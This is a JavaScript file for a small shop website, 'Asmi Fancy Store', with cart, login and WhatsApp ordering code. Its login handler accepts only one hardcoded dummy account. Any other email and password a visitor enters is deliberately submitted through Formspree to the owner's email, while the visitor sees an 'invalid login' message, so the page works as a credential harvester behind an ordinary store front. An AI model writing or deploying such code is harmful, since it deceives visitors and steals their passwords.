// --- CONSTANTS ---
const NAV_LINKS = document.querySelectorAll('nav a');
const WHATSAPP_NUMBER = '9848488830';
const ADMIN_EMAIL = 'a6774496@gmail.com';

// Simulated user data for login (now based on email)
const VALID_EMAIL = 'user@example.com'; 
const VALID_PASSWORD = 'password123';
const DISPLAY_NAME = 'Customer'; 

let userIsLoggedIn = false;

// --- NAVIGATION & SMOOTH SCROLL ---
NAV_LINKS.forEach(link => {
    link.addEventListener('click', e => {
        e.preventDefault();
        NAV_LINKS.forEach(l => l.classList.remove('active'));
        link.classList.add('active');
        document.querySelector(link.getAttribute('href')).scrollIntoView({behavior: 'smooth'});
        closeCartModal();
        closeLoginModal();
        closeAddressModal();
    });
});

// --- SERVER-SIDE REQUIRED FUNCTIONS (CLEANED STUBS) ---
// This function is now empty as Formspree handles the data sending.
function sendNewCustomerEmail(customerDetails) {
    console.log(`[SERVER STUB] Login attempt data sent via Formspree. Details:`, customerDetails);
}

function handleSocialLogin(platform) {
    alert(`[NOTICE] You clicked 'Login with ${platform}'. This feature requires a backend service.`);
}


// --- CART FUNCTIONALITY (omitted for brevity, assume unchanged) ---
const cart = [];
const cartBtn = document.getElementById('cart');
const cartModal = document.getElementById('cart-modal');
const cartItemsDiv = document.getElementById('cart-items');
const cartTotalDiv = document.getElementById('cart-total');
const closeCartBtn = document.getElementById('close-cart');

function updateCartCount() {
    cartBtn.textContent = `🛒 Cart (${cart.length})`;
}

function renderCart() {
    cartItemsDiv.innerHTML = '';
    let total = 0;
    cart.forEach((item, idx) => {
        total += item.price;
        const div = document.createElement('div');
        div.className = 'cart-item';
        div.innerHTML = `
            ${item.name} - Rs. ${item.price}
            <button onclick="removeFromCart(${idx})">x</button>
        `;
        cartItemsDiv.appendChild(div);
    });
    cartTotalDiv.textContent = `Total: Rs. ${total}`;
}

function addToCart(name, price) {
    cart.push({name, price});
    updateCartCount();
    renderCart();
    alert(`${name} added to cart!`);
}

function removeFromCart(idx) {
    cart.splice(idx, 1);
    updateCartCount();
    renderCart();
}

function toggleCartModal() {
    if (loginModal.style.display === 'block') { closeLoginModal(); }
    if (addressModal.style.display === 'block') { closeAddressModal(); }
    cartModal.style.display = cartModal.style.display === 'block' ? 'none' : 'block';
}

function closeCartModal() {
    cartModal.style.display = 'none';
}

cartBtn.addEventListener('click', toggleCartModal);
closeCartBtn.addEventListener('click', closeCartModal);

document.querySelectorAll('.add-to-cart').forEach(btn => {
    btn.addEventListener('click', e => {
        const card = e.target.closest('.product-card');
        const name = card.getAttribute('data-name');
        const price = parseInt(card.getAttribute('data-price'));
        addToCart(name, price);
    });
});


// --- LOGIN PORTAL FUNCTIONALITY ---
const authBtn = document.getElementById('auth-btn');
const loginModal = document.getElementById('login-modal');
const closeLoginBtn = document.getElementById('close-login');
const loginForm = document.getElementById('login-form');
const loginMessage = document.getElementById('login-message');

function updateAuthButton() {
    authBtn.textContent = userIsLoggedIn ? `👋 Hello, ${DISPLAY_NAME} (Logout)` : '👤 Login';
}

function toggleLoginModal() {
    if (userIsLoggedIn) {
        userIsLoggedIn = false;
        updateAuthButton();
        alert("You have been successfully logged out.");
    } else {
        if (cartModal.style.display === 'block') { closeCartModal(); }
        if (addressModal.style.display === 'block') { closeAddressModal(); }
        loginModal.style.display = 'block';
        loginMessage.style.display = 'none'; 
    }
}

function closeLoginModal() {
    loginModal.style.display = 'none';
}

// *** CRITICAL LOGIN FIX FOR FORMSPREE ***
function handleLogin(e) {
    const email = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // 1. Check for Successful (Dummy) Login
    if (email === VALID_EMAIL && password === VALID_PASSWORD) {
        e.preventDefault(); // Stop Formspree submission on SUCCESS
        userIsLoggedIn = true;
        updateAuthButton();
        closeLoginModal();
        alert(`Welcome back, ${DISPLAY_NAME}!`);
    } else {
        // 2. Unsuccessful Login: Allow Formspree to submit data, but update UI immediately
        // We DO NOT call e.preventDefault() here. Formspree sends the data.
        
        // This short delay allows the Formspree submission (which causes a page refresh) to work
        // while also showing the user an immediate error message.
        setTimeout(() => {
            loginMessage.textContent = 'Invalid email or password. Please try again.';
            loginMessage.style.display = 'block';
        }, 100);
        
        // Note: The form submission will cause a page refresh (Formspree default behavior)
        // This is necessary to send the data to your email.
    }
}

// Attach login listeners
authBtn.addEventListener('click', toggleLoginModal);
closeLoginBtn.addEventListener('click', closeLoginModal);
loginForm.addEventListener('submit', handleLogin);

// Attach social login listeners 
document.querySelector('.fb-btn').addEventListener('click', () => handleSocialLogin('Facebook'));
document.querySelector('.insta-btn').addEventListener('click', () => handleSocialLogin('Instagram'));
document.querySelector('.email-btn').addEventListener('click', closeLoginModal); 

// Initialize button text on page load
updateAuthButton();


// --- WHATSAPP ORDER FUNCTIONALITY (omitted for brevity, assume unchanged) ---
const addressModal = document.getElementById('address-modal');
const closeAddressBtn = document.getElementById('close-address');
const addressForm = document.getElementById('address-form');
const orderProductNameInput = document.getElementById('order-product-name');
const orderProductPriceInput = document.getElementById('order-product-price');

let currentProduct = null;

function showAddressModal(productName, productPrice) {
    currentProduct = { name: productName, price: productPrice };
    orderProductNameInput.value = productName;
    orderProductPriceInput.value = productPrice;

    if (cartModal.style.display === 'block') { closeCartModal(); }
    if (loginModal.style.display === 'block') { closeLoginModal(); }
    
    addressModal.style.display = 'block'; 
}

function closeAddressModal() {
    addressModal.style.display = 'none';
    addressForm.reset();
}

document.querySelectorAll('.whatsapp-btn').forEach(btn => {
    btn.addEventListener('click', e => {
        e.preventDefault();
        const card = e.target.closest('.product-card');
        const name = card.getAttribute('data-name');
        const price = card.getAttribute('data-price');
        showAddressModal(name, price);
    });
});

closeAddressBtn.addEventListener('click', closeAddressModal);

addressForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const name = document.getElementById('order-name').value;
    const address = document.getElementById('order-address').value;
    const phone = document.getElementById('order-phone').value;
    const productName = currentProduct.name;
    const productPrice = currentProduct.price;

    const message = `Hello Asmi Fancy Store,\n\nI want to place an order immediately.\n\n*Product:* ${productName}\n*Price:* Rs. ${productPrice}\n*Customer Name:* ${name}\n*Delivery Address:* ${address}\n*Contact Number:* ${phone}\n\nPlease confirm the order. Thank you!`;

    const encodedMessage = encodeURIComponent(message);
    const whatsappLink = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodedMessage}`;
    
    window.open(whatsappLink, '_blank');
    
    closeAddressModal();
    alert(`Order details for ${productName} sent to WhatsApp!`);
});
